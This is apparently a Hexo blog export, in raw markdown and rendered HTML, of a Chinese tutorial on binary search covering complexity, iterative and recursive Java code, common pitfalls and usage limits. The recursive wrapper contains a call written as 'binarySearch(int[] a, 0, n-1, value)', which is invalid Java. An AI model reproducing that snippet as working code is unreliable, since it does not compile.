和value的大小，来更新接下来要查找的区间范围，知道找到或者区间缩小为0，就退出。如果你有一些编程基础，看懂这些应该不难。现在，我们着重看一下容易出错的3个地方。\n\n**1、循环退出条件**\n\n注意是low<=high， 而不是low < high\n\n**2、mid的取值**\n\n实际上，mid=(low+high)/2 这种写法是有问题的，因为如果low和high比较大的话，两者之和就有可能会溢出。改进方案是将mid的计算方式改写成low+(high-low)/2，更进一步，如果要将性能优化到极致的话，我们可以将除2的操作转化为位运算low+((high-low)>>1)，因为相比较除法运算来说，计算机处理位运算要快得多。\n\n**3、low和high的更新**\n\nlow=mid+1，high=mid-1,。注意这里的+1和-1，如果直接写成low=mid或者high=mid，就可能会发生死循环。比如，当high=3，low=3时，如果a[3]不等于value，就会导致一直循环不退出。\n\n如果你已经留意到上面讲到的三点，我想你已经可以实现一个简单的二分查找了。实际上，二分查找除了用循环来实现，还可以用递归来实现，过程也非常简单。\n\n```java\npublic int binarySearch(int[] a,int n, int value){\n\treturn binarySearch(int[] a, 0, n-1, value);\n}\n\npublic int binarySearch(int[] a, int low, int high, int value){\n\tif(low > high) return -1;\n\n\tint mid = low + ((high-low)>>1);\n\tif(a[mid] == value) {\n\t\treturn mid;\n\t}else if(a[mid] < value) {\n\t\treturn binarySearch(a, mid+1, high, value);\n\t}else{\n\t\treturn binarySearch(a, low, mid-1, value);\n\t}\n}\n```\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 二分查找应用场景的局限性\n{% endnote %}\n</div>\n\n前面我们分析过，二分查找的时间复杂度是O(logn)，查找数据的效率非常高。不过，并不是什么情况下都可以用二分查找，他的应用场景是有很大局限性的。那么什么情况下适合用二分查找，什么情况下不适合呢？\n\n**首先，二分查找依赖的是顺序表结构，简单点说就是数组**\n\n那二分查找能否依赖其他数据结构呢？比如链表，答案是不可以，主要是二分查找算法需要按照下标随机访问元素。我们在数组和链表那两节讲过，数组按照下标随机访问数据的时间复杂度是O(1)，而链表随机访问的时间复杂度是O(n)。所以，如果数据使用链表存储，二分查找的时间复杂度就会变得很高。\n\n二分查找只能用在数据是通过顺序表来存储的数据结构上，如果你的数据是通过其他结构存储的，则无法应用二分查找。\n\n**其次，二分查找针对的是有序数据**\n\n二分查找对这一点的要求比较严苛，数据必须是有序的。如果数据没有序，我们需要先排序。前面章节我们讲过，排序时间复杂度最低的是O(nlogn)。所以，如果我们针对的是一组静态数据，没有频繁地插入、删除，我们可以进行一次排序，多次二分查找。这样排序的成本可被均摊，二分查找的边际成本就会比较低。\n\n但是，如果我们的数据集合有频繁的插入、删除操作，要想用二分查找，要么每次插入、删除操作之后保证数据仍然有序，要么在每次二分查找之前都要先进行排序。针对这种动态数据集合，无论哪种方法，维护有序的成本都是很高的。\n\n所以二分查找只能用在插入、删除操作不频繁，一次排序多次查找的场景中。针对动态变化的数据集合，二分查找将不再适用。针对动态的数据集合，如何在其中快速查找某个数据呢？等到二叉树那一节会详细讲。\n\n**再次，数据量太小不太适合二分查找**.\n\n如果要处理的数据量太小，完全没有必要使用二分查找，顺序遍历就可以了。比如我们在一个大小为10的数组中查找一个元素，不管是用二分查找，还是顺序遍历，查找速度都差不多。只有数据量较大的时候，二分查找的优势才比较明显。\n\n不过，这里有一个例外，如果数据之间的比较操作比较耗时，不管数据量大小，都推荐使用二分查找。比如数组中存储的数据都是长度查过300的字符串，如此长的两个字符串之间比对大小，就会非常耗时。我们需要尽可能煎炒比较次数，而比较次数的减少会大大提高性能能，这个时候二分查找就比顺序遍历更有优势。\n\n**最后，数据量太大也不适合用二分查找**\n\n二分查找的底层需要依赖数组这种数据结构，而数组为了支持随机访问的特性，要求内存空间连续，对内存空间的要求比较严苛。比如，我们有1GB大小的数据，如果希望用数组来存储，那就需要1GB的连续内存空间。\n\n注意这里的\"连续\"二字，也就是说，即便有2GB的内存空间剩余，如果没有连续的1GB大小的内存空间，那照样无法申请一个1GB大小的数组。而我们的二分查找是作用在数组这种数据结构之上的，所以太大的数据用数组存储就比较吃力了，也就不能用二分查找了。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 解答开篇\n{% endnote %}\n</div>\n\n二分查找的理论知识你应该已经掌握了，我们来看下开篇的思考题：如何在1000万个整数中快速查找某个整数。\n\n这个问题并不难，我们的内存限制是100MB，每个数据大小为8字节，最简单的办法就是将数据存储在数组中，内存占用差不多是80MB，符合内存的限制。借助今天讲的内容，我们可以先对这1000万个数据进行从小到大排序，然后再利用二分查找算法，就可以快速查找出想要的数据了。\n\n看起来这个问题并不难，很轻松就能解决。实际上，它暗藏玄机，如果你对数据结构和算法有一定了解，知道散列表、二叉树这些支持快速查找的动态数据结构，你可能会觉得，用散列表、二叉树也可以解决这个问题，实际上是不行的。\n\n虽然大部分情况下，用二分查找可以解决的问题，用散列表、二叉树都可以解决。但是，我们后面会讲到，不管是散列表还是二叉树，都会需要比较多的额外的内存空间，如果用散列表或者二叉树来存储这1000万个数据，用100MB的内存肯定是存储不下来的。而二分查找底层依赖的是数组，除了数据本身之外，不需要额外的其他信息，是最省内存空间的存储方式，所以刚好能在限定的内存大小内解决这个问题。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 内容小结\n{% endnote %}\n</div>\n\n今天我们学习了一种针对有序数据的一种高效的查找算法，二分查找，它的时间复杂度是O(logn)。\n\n二分查找的算法核心思想理解起来非常简单，有点类似分治思想。即每次都通过跟区间的中间元素进行对比，将待查找的区间缩小为一半，直到找到要查找的元素，或者区间被缩小为0。但是二分查找的代码比较容易写错，你需要着重掌握三个容易出错的地方：循环退出条件、mid的取值、low和high的更新。\n\n二分查找虽然性能比较优秀，但是应用场景比较有限。底层必须依赖数组，并且还要求数据有序。对于较小规模的数据查找，我们直接使用顺序遍历就可以了，二分查找的优势并不明显。二分查找更适合处理静态数据，也就是没有频繁的数据插入、删除操作。\n\n### 课后思考\n\n1、如何编程实现\"求一个数的平方根\"？要求精确到小数点后6位。\n\n2、我刚才说了，如果数据使用链表存储，二分查找的时间复杂度就会变得很高，那查找的时间复杂度究竟是多少呢？如果你自己推导一下，你就会深刻的认识到，为何我们回西安则用数组而不用链表来实现二分查找了。\n\n\n\n\n\n\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-二分查找-上","published":1,"updated":"2019-06-26T03:52:03.507Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2mj004ho25tbqi44xpw","content":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>今天我们将一种针对有序数据集合的查找算法：<strong>二分查找（Binary Search）算法</strong>，也叫折半查找算法。二分查找算法的思想非常简单，很多计算机专业的同学很容易就能理解，但是看似简单的东西有时候很难掌握，想要灵活运用就更加困难。</p>\n<p>我们先来看一道思考题：假设我们有1000万个整数数据，每个数据占8个字节，<strong>如何设计数据结构和算法，快速判断某个整数是否出现在这1000万个数据中？</strong>，我们希望这个功能不要占用太多的内存空间，最好不要查过100MB，你会怎么做呢？带着这个问题，开始学习今天的内容。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"无处不在的二分思想\"><a href=\"#无处不在的二分思想\" class=\"headerlink\" title=\"无处不在的二分思想\"></a>无处不在的二分思想</h3></div><br></div>\n\n<p>二分查找是一种非常简单易懂的快速查找算法，生活中到处可见。比如说，我们现在来做一个猜字游戏。我随机写一个0到99之间的数字，然后你来猜我写的是什么。猜的过程中，你每猜一次，我就会告诉你猜的大了还是小了，直到猜中为止。你来想想，如何快速猜中我写的数字呢？</p>\n<p>假设我写的数字是23，你可以按照下面的步骤来试一试。</p>\n<table>\n<thead>\n<tr>\n<th>次数</th>\n<th>猜测范围</th>\n<th>中间数</th>\n<th>对比大小</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>第一次</td>\n<td>0-99</td>\n<td>49</td>\n<td>49&gt;23</td>\n</tr>\n<tr>\n<td>第二次</td>\n<td>0-48</td>\n<td>24</td>\n<td>24&gt;23</td>\n</tr>\n<tr>\n<td>第三次</td>\n<td>0-23</td>\n<td>11</td>\n<td>11&lt;23</td>\n</tr>\n<tr>\n<td>第四次</td>\n<td>12-23</td>\n<td>17</td>\n<td>17&lt;23</td>\n</tr>\n<tr>\n<td>第五次</td>\n<td>18-23</td>\n<td>20</td>\n<td>20&lt;23</td>\n</tr>\n<tr>\n<td>第六次</td>\n<td>21-23</td>\n<td>22</td>\n<td>22&lt;23</td>\n</tr>\n<tr>\n<td>第七次</td>\n<td>23</td>\n<td></td>\n<td>√</td>\n</tr>\n</tbody>\n</table>\n<p>7次就猜出来了，是不是很快？这个例子用的就是二分思想，按照这个思想，即使我让你猜的是0-999的数字，最多也只要10次就能猜中。不信的话，你试一试。</p>\n<p>这是一个生活中的例子，我们现在回到实际的开发场景中。假设有1000条订单数据，已经按照订单金额从小到大排序，每个订单金额都不同，并且最小单元是元。我们现在想知道是否存在金额等于19元的订单。如果存在，返回订单数据，否则返回null。</p>\n<p>最简单的办法当然是从第一个订单开始，一个一个遍历这1000个订单，知道找到金额等于19元的订单为止。但这样查找会比较慢，最坏情况下，可能要遍历完中1000条记录才能找到。那用二分查找能不能更快解决呢？</p>\n<p>为了方便理解，我们假设只有10个订单，订单金额分别是：8,11,19,23,27,33,45,55,67,98。</p>\n<p>还是利用二分思想，每次都与区间的中间数据比较大小，缩小查找的范围。为了更加直观，我画了一张查找过程的图，其中，low和high表示待查找区间的下标，mid表示待查找区间中间元素下标。</p>\n\n<p>看懂这两个例子，你现在对二分的思想应该掌握的妥妥的了。这里稍微总结一下，<strong>二分查找针对的是一个有序的数据集合，查找思想有点类似于分治思想，每次都通过跟区间的中间元素对比，将待查找的区间缩小为原来的一半，直到查找到相应的元素，或者区间被缩小为0</strong>。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"O-logn-惊人的查找速度\"><a href=\"#O-logn-惊人的查找速度\" class=\"headerlink\" title=\"O(logn)惊人的查找速度\"></a>O(logn)惊人的查找速度</h3></div><br></div>\n\n<p>二分查找是一种非常高效的查找算法，高效到什么程度呢？我们来分析一下它的时间复杂度。</p>\n<p>我们假设数据大小是n，每次查找后数据都会缩小为原来的一半，也就是会除以2，最坏情况下，直到查找的区间被缩小为空，才停止。</p>\n<div style=\"text-align: center; color: red;\"><br><blockquote class=\"blockquote-center\"><p>被查找区间的大小变化<br>$$ n,\\ \\frac n 2,\\ \\frac n4,\\ \\frac n8, …,\\ \\frac n{2^k} $$</p>\n</blockquote><br></div>\n\n<p>可以看出，这是一个等比数列。其中$ \\frac n {2^k} = 1$时，k的值就是总共缩小的次数。而每一次缩只涉及两个数据的大小比较，所以经过了k次区间缩小操作，时间复杂度就是O(k)。通过$ \\frac n {2^k} = 1$，我们可以求得$k\\ =\\ log_2n$。所以时间复杂度是O(logn)。</p>\n<p>二分查找是我们目前为止遇到的第一个时间复杂度为O(logn)的算法。后面我们还会讲堆、二叉树的操作等，他们的时间复杂度也是O(logn)。我这里就在深入讲讲O(logn)这种对数时间复杂度。这是一种极其高效的时间复杂度，有的时候甚至比时间复杂度是常量级O(1)的算法还要高效。为什么这么说呢？</p>\n<p>因为logn是一个非常“恐怖”的量级，即便n非常非常大，对应的logn也很小，比如n等于2的32次方，这个数很大了吧？大约是42亿。也就是说，如果我们在42亿个数据中用二分查找一个数据，最多需要比较32次。</p>\n<p>我们前面讲过，用大O表示法表示时间复杂度的时候，会省略掉常数、系数和低阶。对于常量级时间复杂度的算法来说，O(1)有可能表示的是一个非常大的常数量，比如O(1000)、O(10000)。所以常量级时间复杂度的算法有时候可能还没有O(logn)的算法执行效率高。</p>\n<p>反过来，对数对应的就是指数。有一个非常著名的“阿基米德与国王下棋的故事”，你可以自行搜索一下，感受一下指数的”恐怖”。这也是为什么我们说，指数级时间复杂度的算法在大规模数据面前是无效的。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"二分查找的递归实现与非递归实现\"><a href=\"#二分查找的递归实现与非递归实现\" class=\"headerlink\" title=\"二分查找的递归实现与非递归实现\"></a>二分查找的递归实现与非递归实现</h3></div><br></div>\n\n<p>实际上，简单的二分查找并不难写，注意这里的”简单”二字。下一节，我们会讲到二分查找的变体问题，那才是烧脑的。今天，我们来看看如果写简单的二分查找。</p>\n<p><strong>最简单的情况就是有序数组中不存在重复的元素</strong>，我们在其中用二分查找值等于给定值的数据，我用Java代码实现了一个简单的二分查找算法。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// a 有序数组</span></span><br><span class=\"line\"><span class=\"comment\">// n 数组大小</span></span><br><span class=\"line\"><span class=\"comment\">// value 待查找的元素</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">binarySearch</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> n, <span class=\"keyword\">int</span> value)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> low = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> high = n-<span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(low &lt;= high)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> mid = (high + low)/<span class=\"number\">2</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(a[mid] == value) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> mid;</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(a[mid] &lt; value) &#123;</span><br><span class=\"line\">\t\t\tlow = mid + <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t\thigh = mid -<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> -<span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这段代码我稍微解释一下，low、high、mid都是指数组下标，其中，low和high表示当前查找的区间范围，初始low=0，high=n-1。mid表示[low、high]的中间位置。我们通过对比a[mid] 和value的大小，来更新接下来要查找的区间范围，知道找到或者区间缩小为0，就退出。如果你有一些编程基础，看懂这些应该不难。现在，我们着重看一下容易出错的3个地方。</p>\n<p><strong>1、循环退出条件</strong></p>\n<p>注意是low&lt;=high， 而不是low &lt; high</p>\n<p><strong>2、mid的取值</strong></p>\n<p>实际上，mid=(low+high)/2 这种写法是有问题的，因为如果low和high比较大的话，两者之和就有可能会溢出。改进方案是将mid的计算方式改写成low+(high-low)/2，更进一步，如果要将性能优化到极致的话，我们可以将除2的操作转化为位运算low+((high-low)&gt;&gt;1)，因为相比较除法运算来说，计算机处理位运算要快得多。</p>\n<p><strong>3、low和high的更新</strong></p>\n<p>low=mid+1，high=mid-1,。注意这里的+1和-1，如果直接写成low=mid或者high=mid，就可能会发生死循环。比如，当high=3，low=3时，如果a[3]不等于value，就会导致一直循环不退出。</p>\n<p>如果你已经留意到上面讲到的三点，我想你已经可以实现一个简单的二分查找了。实际上，二分查找除了用循环来实现，还可以用递归来实现，过程也非常简单。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">binarySearch</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a,<span class=\"keyword\">int</span> n, <span class=\"keyword\">int</span> value)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> binarySearch(<span class=\"keyword\">int</span>[] a, <span class=\"number\">0</span>, n-<span class=\"number\">1</span>, value);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">binarySearch</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> low, <span class=\"keyword\">int</span> high, <span class=\"keyword\">int</span> value)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(low &gt; high) <span class=\"keyword\">return</span> -<span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> mid = low + ((high-low)&gt;&gt;<span class=\"number\">1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(a[mid] == value) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> mid;</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(a[mid] &lt; value) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> binarySearch(a, mid+<span class=\"number\">1</span>, high, value);</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> binarySearch(a, low, mid-<span class=\"number\">1</span>, value);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"二分查找应用场景的局限性\"><a href=\"#二分查找应用场景的局限性\" class=\"headerlink\" title=\"二分查找应用场景的局限性\"></a>二分查找应用场景的局限性</h3></div><br></div>\n\n<p>前面我们分析过，二分查找的时间复杂度是O(logn)，查找数据的效率非常高。不过，并不是什么情况下都可以用二分查找，他的应用场景是有很大局限性的。那么什么情况下适合用二分查找，什么情况下不适合呢？</p>\n<p><strong>首先，二分查找依赖的是顺序表结构，简单点说就是数组</strong></p>\n<p>那二分查找能否依赖其他数据结构呢？比如链表，答案是不可以，主要是二分查找算法需要按照下标随机访问元素。我们在数组和链表那两节讲过，数组按照下标随机访问数据的时间复杂度是O(1)，而链表随机访问的时间复杂度是O(n)。所以，如果数据使用链表存储，二分查找的时间复杂度就会变得很高。</p>\n<p>二分查找只能用在数据是通过顺序表来存储的数据结构上，如果你的数据是通过其他结构存储的，则无法应用二分查找。</p>\n<p><strong>其次，二分查找针对的是有序数据</strong></p>\n<p>二分查找对这一点的要求比较严苛，数据必须是有序的。如果数据没有序，我们需要先排序。前面章节我们讲过，排序时间复杂度最低的是O(nlogn)。所以，如果我们针对的是一组静态数据，没有频繁地插入、删除，我们可以进行一次排序，多次二分查找。这样排序的成本可被均摊，二分查找的边际成本就会比较低。</p>\n<p>但是，如果我们的数据集合有频繁的插入、删除操作，要想用二分查找，要么每次插入、删除操作之后保证数据仍然有序，要么在每次二分查找之前都要先进行排序。针对这种动态数据集合，无论哪种方法，维护有序的成本都是很高的。</p>\n<p>所以二分查找只能用在插入、删除操作不频繁，一次排序多次查找的场景中。针对动态变化的数据集合，二分查找将不再适用。针对动态的数据集合，如何在其中快速查找某个数据呢？等到二叉树那一节会详细讲。</p>\n<p><strong>再次，数据量太小不太适合二分查找</strong>.</p>\n<p>如果要处理的数据量太小，完全没有必要使用二分查找，顺序遍历就可以了。比如我们在一个大小为10的数组中查找一个元素，不管是用二分查找，还是顺序遍历，查找速度都差不多。只有数据量较大的时候，二分查找的优势才比较明显。</p>\n<p>不过，这里有一个例外，如果数据之间的比较操作比较耗时，不管数据量大小，都推荐使用二分查找。比如数组中存储的数据都是长度查过300的字符串，如此长的两个字符串之间比对大小，就会非常耗时。我们需要尽可能煎炒比较次数，而比较次数的减少会大大提高性能能，这个时候二分查找就比顺序遍历更有优势。</p>\n<p><strong>最后，数据量太大也不适合用二分查找</strong></p>\n<p>二分查找的底层需要依赖数组这种数据结构，而数组为了支持随机访问的特性，要求内存空间连续，对内存空间的要求比较严苛。比如，我们有1GB大小的数据，如果希望用数组来存储，那就需要1GB的连续内存空间。</p>\n<p>注意这里的”连续”二字，也就是说，即便有2GB的内存空间剩余，如果没有连续的1GB大小的内存空间，那照样无法申请一个1GB大小的数组。而我们的二分查找是作用在数组这种数据结构之上的，所以太大的数据用数组存储就比较吃力了，也就不能用二分查找了。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"解答开篇\"><a href=\"#解答开篇\" class=\"headerlink\" title=\"解答开篇\"></a>解答开篇</h3></div><br></div>\n\n<p>二分查找的理论知识你应该已经掌握了，我们来看下开篇的思考题：如何在1000万个整数中快速查找某个整数。</p>\n<p>这个问题并不难，我们的内存限制是100MB，每个数据大小为8字节，最简单的办法就是将数据存储在数组中，内存占用差不多是80MB，符合内存的限制。借助今天讲的内容，我们可以先对这1000万个数据进行从小到大排序，然后再利用二分查找算法，就可以快速查找出想要的数据了。</p>\n<p>看起来这个问题并不难，很轻松就能解决。实际上，它暗藏玄机，如果你对数据结构和算法有一定了解，知道散列表、二叉树这些支持快速查找的动态数据结构，你可能会觉得，用散列表、二叉树也可以解决这个问题，实际上是不行的。</p>\n<p>虽然大部分情况下，用二分查找可以解决的问题，用散列表、二叉树都可以解决。但是，我们后面会讲到，不管是散列表还是二叉树，都会需要比较多的额外的内存空间，如果用散列表或者二叉树来存储这1000万个数据，用100MB的内存肯定是存储不下来的。而二分查找底层依赖的是数组，除了数据本身之外，不需要额外的其他信息，是最省内存空间的存储方式，所以刚好能在限定的内存大小内解决这个问题。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"内容小结\"><a href=\"#内容小结\" class=\"headerlink\" title=\"内容小结\"></a>内容小结</h3></div><br></div>\n\n<p>今天我们学习了一种针对有序数据的一种高效的查找算法，二分查找，它的时间复杂度是O(logn)。</p>\n<p>二分查找的算法核心思想理解起来非常简单，有点类似分治思想。即每次都通过跟区间的中间元素进行对比，将待查找的区间缩小为一半，直到找到要查找的元素，或者区间被缩小为0。但是二分查找的代码比较容易写错，你需要着重掌握三个容易出错的地方：循环退出条件、mid的取值、low和high的更新。</p>\n<p>二分查找虽然性能比较优秀，但是应用场景比较有限。底层必须依赖数组，并且还要求数据有序。对于较小规模的数据查找，我们直接使用顺序遍历就可以了，二分查找的优势并不明显。二分查找更适合处理静态数据，也就是没有频繁的数据插入、删除操作。</p>\n<h3 id=\"课后思考\"><a href=\"#课后思考\" class=\"headerlink\" title=\"课后思考\"></a>课后思考</h3><p>1、如何编程实现”求一个数的平方根”？要求精确到小数点后6位。</p>\n<p>2、我刚才说了，如果数据使用链表存储，二分查找的时间复杂度就会变得很高，那查找的时间复杂度究竟是多少呢？如果你自己推导一下，你就会深刻的认识到，为何我们回西安则用数组而不用链表来实现二分查找了。</p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>今天我们将一种针对有序数据集合的查找算法：<strong>二分查找（Binary Search）算法</strong>，也叫折半查找算法。二分查找算法的思想非常简单，很多计算机专业的同学很容易就能理解，但是看似简单的东西有时候很难掌握，想要灵活运用就更加困难。</p>\n<p>我们先来看一道思考题：假设我们有1000万个整数数据，每个数据占8个字节，<strong>如何设计数据结构和算法，快速判断某个整数是否出现在这1000万个数据中？</strong>，我们希望这个功能不要占用太多的内存空间，最好不要查过100MB，你会怎么做呢？带着这个问题，开始学习今天的内容。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"无处不在的二分思想\"><a href=\"#无处不在的二分思想\" class=\"headerlink\" title=\"无处不在的二分思想\"></a>无处不在的二分思想</h3></div><br></div>\n\n<p>二分查找是一种非常简单易懂的快速查找算法，生活中到处可见。比如说，我们现在来做一个猜字游戏。我随机写一个0到99之间的数字，然后你来猜我写的是什么。猜的过程中，你每猜一次，我就会告诉你猜的大了还是小了，直到猜中为止。你来想想，如何快速猜中我写的数字呢？</p>\n<p>假设我写的数字是23，你可以按照下面的步骤来试一试。</p>\n<table>\n<thead>\n<tr>\n<th>次数</th>\n<th>猜测范围</th>\n<th>中间数</th>\n<th>对比大小</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>第一次</td>\n<td>0-99</td>\n<td>49</td>\n<td>49&gt;23</td>\n</tr>\n<tr>\n<td>第二次</td>\n<td>0-48</td>\n<td>24</td>\n<td>24&gt;23</td>\n</tr>\n<tr>\n<td>第三次</td>\n<td>0-23</td>\n<td>11</td>\n<td>11&lt;23</td>\n</tr>\n<tr>\n<td>第四次</td>\n<td>12-23</td>\n<td>17</td>\n<td>17&lt;23</td>\n</tr>\n<tr>\n<td>第五次</td>\n<td>18-23</td>\n<td>20</td>\n<td>20&lt;23</td>\n</tr>\n<tr>\n<td>第六次</td>\n<td>21-23</td>\n<td>22</td>\n<td>22&lt;23</td>\n</tr>\n<tr>\n<td>第七次</td>\n<td>23</td>\n<td></td>\n<td>√</td>\n</tr>\n</tbody>\n</table>\n<p>7次就猜出来了，是不是很快？这个例子用的就是二分思想，按照这个思想，即使我让你猜的是0-999的数字，最多也只要10次就能猜中。不信的话，你试一试。</p>\n<p>这是一个生活中的例子，我们现在回到实际的开发场景中。假设有1000条订单数据，已经按照订单金额从小到大排序，每个订单金额都不同，并且最小单元是元。我们现在想知道是否存在金额等于19元的订单。如果存在，返回订单数据，否则返回null。</p>\n<p>最简单的办法当然是从第一个订单开始，一个一个遍历这1000个订单，知道找到金额等于19元的订单为止。但这样查找会比较慢，最坏情况下，可能要遍历完中1000条记录才能找到。那用二分查找能不能更快解决呢？</p>\n<p>为了方便理解，我们假设只有10个订单，订单金额分别是：8,11,19,23,27,33,45,55,67,98。</p>\n<p>还是利用二分思想，每次都与区间的中间数据比较大小，缩小查找的范围。为了更加直观，我画了一张查找过程的图，其中，low和high表示待查找区间的下标，mid表示待查找区间中间元素下标。</p>\n\n<p>看懂这两个例子，你现在对二分的思想应该掌握的妥妥的了。这里稍微总结一下，<strong>二分查找针对的是一个有序的数据集合，查找思想有点类似于分治思想，每次都通过跟区间的中间元素对比，将待查找的区间缩小为原来的一半，直到查找到相应的元素，或者区间被缩小为0</strong>。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"O-logn-惊人的查找速度\"><a href=\"#O-logn-惊人的查找速度\" class=\"headerlink\" title=\"O(logn)惊人的查找速度\"></a>O(logn)惊人的查找速度</h3></div><br></div>\n\n<p>二分查找是一种非常高效的查找算法，高效到什么程度呢？我们来分析一下它的时间复杂度。</p>\n<p>我们假设数据大小是n，每次查找后数据都会缩小为原来的一半，也就是会除以2，最坏情况下，直到查找的区间被缩小为空，才停止。</p>\n<div style=\"text-align: center; color: red;\"><br><blockquote class=\"blockquote-center\"><p>被查找区间的大小变化<br>$$ n,\\ \\frac n 2,\\ \\frac n4,\\ \\frac n8, …,\\ \\frac n{2^k} $$</p>\n</blockquote><br></div>\n\n<p>可以看出，这是一个等比数列。其中$ \\frac n {2^k} = 1$时，k的值就是总共缩小的次数。而每一次缩只涉及两个数据的大小比较，所以经过了k次区间缩小操作，时间复杂度就是O(k)。通过$ \\frac n {2^k} = 1$，我们可以求得$k\\ =\\ 